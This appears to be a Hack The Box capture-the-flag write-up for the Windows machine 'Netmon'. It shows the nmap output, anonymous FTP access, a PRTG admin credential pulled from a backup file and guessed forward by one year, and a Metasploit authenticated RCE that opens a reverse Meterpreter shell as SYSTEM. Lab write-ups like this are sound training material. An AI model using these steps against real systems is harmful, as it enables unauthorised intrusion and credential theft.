# Netmon

Machine Level: Easy <br />
OS: Windows

## Scanning 
I ran an aggressive NMAP scan to figure out what services were running on the machine. 
```
ajread@aj-ubuntu:~/hackthebox$ nmap -A [TARGET IP] -Pn
Starting Nmap 7.80 ( https://nmap.org ) at 2023-02-17 14:21 EST
Nmap scan report for [TARGET IP]
Host is up (0.013s latency).
Not shown: 995 closed ports
PORT    STATE SERVICE      VERSION
21/tcp  open  ftp          Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 02-02-19  11:18PM                 1024 .rnd
| 02-25-19  09:15PM       <DIR>          inetpub
| 07-16-16  08:18AM       <DIR>          PerfLogs
| 02-25-19  09:56PM       <DIR>          Program Files
| 02-02-19  11:28PM       <DIR>          Program Files (x86)
| 02-03-19  07:08AM       <DIR>          Users
|_02-25-19  10:49PM       <DIR>          Windows
| ftp-syst: 
|_  SYST: Windows_NT
80/tcp  open  http         Indy httpd 18.1.37.13946 (Paessler PRTG bandwidth monitor)
|_http-server-header: PRTG/18.1.37.13946
| http-title: Welcome | PRTG Network Monitor (NETMON)
|_Requested resource was /index.htm
|_http-trane-info: Problem with XML parsing of /evox/about
135/tcp open  msrpc        Microsoft Windows RPC
139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
|_ms-sql-info: ERROR: Script execution failed (use -d to debug)
|_smb-os-discovery: ERROR: Script execution failed (use -d to debug)
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2023-02-17T19:22:02
|_  start_date: 2023-02-17T19:19:21

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.38 seconds
```
## Enumeration
I logged into the anonymous FTP service. 
```
ajread@aj-ubuntu:~/hackthebox$ ftp [TARGET IP]
Connected to [TARGET IP].
220 Microsoft FTP Service
Name ([TARGET IP]:ajread): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password: 
230 User logged in.
Remote system type is Windows_NT.
ftp> ls
229 Entering Extended Passive Mode (|||49840|)
150 Opening ASCII mode data connection.
02-02-19  11:18PM                 1024 .rnd
02-25-19  09:15PM       <DIR>          inetpub
07-16-16  08:18AM       <DIR>          PerfLogs
02-25-19  09:56PM       <DIR>          Program Files
02-02-19  11:28PM       <DIR>          Program Files (x86)
02-03-19  07:08AM       <DIR>          Users
02-25-19  10:49PM       <DIR>          Windows
226 Transfer complete.
```
## Initial Access
And I found the user flag. 
```
ftp> get user.txt
local: user.txt remote: user.txt
229 Entering Extended Passive Mode (|||49857|)
125 Data connection already open; Transfer starting.
100% |*************************************|    34        1.75 KiB/s    00:00 ETA
226 Transfer complete.
34 bytes received in 00:00 (1.71 KiB/s)
```
I used the hackthebox writeup to help me with the next step. Looking at the PRTG [documentation](https://kb.paessler.com/en/topic/463-how-and-where-does-prtg-store-its-data), there are interesting configuration files that could be view. One of them is an old.bak, which I downloaded.
```
ftp> get PRTG\ Configuration.old.bak
local: PRTG Configuration.old.bak remote: PRTG Configuration.old.bak
229 Entering Extended Passive Mode (|||50835|)
150 Opening ASCII mode data connection.
100% |*************************************|  1126 KiB    5.37 MiB/s    00:00 ETA
226 Transfer complete.
1153755 bytes received in 00:00 (5.36 MiB/s)
```
Within the file, I found user credentials to the db. 
```
            <dbpassword>
	      <!-- User: prtgadmin -->
	      [REDACTED]
            </dbpassword>
```
The creds had to be incremented by a year to follow the pattern. Now, I had access to the network monitor. 
## Privilege Escalation 
I did some research and found that this version of PRTG is vulnerable to remote code execution using notifications and poor input validation. More information can be found [here](https://www.rapid7.com/db/modules/exploit/windows/http/prtg_authenticated_rce/). I took the easy way out and loaded up metasploit to throw the ```prtg_authenticated_rce``` at the box using the admin credentials. 
```
msf6 exploit(windows/http/prtg_authenticated_rce) > run

[*] Started reverse TCP handler on [LOCAL IP]:4444 
[+] Successfully logged in with provided credentials
[+] Created malicious notification (objid=2018)
[+] Triggered malicious notification
[+] Deleted malicious notification
[*] Waiting for payload execution.. (30 sec. max)
[*] Sending stage (175686 bytes) to [TARGET IP]
[*] Meterpreter session 1 opened ([LOCAL IP]:4444 -> [TARGET IP]:51051) at 2023-02-17 15:41:08 -0500

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter > 
```
I was dropped into a shell and able to view the root flag.
```
meterpreter > dir
Listing: C:\Users\Administrator\Desktop
=======================================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100666/rw-rw-rw-  282   fil   2019-02-03 07:08:39 -0500  desktop.ini
100444/r--r--r--  34    fil   2023-02-17 14:19:59 -0500  root.txt
```
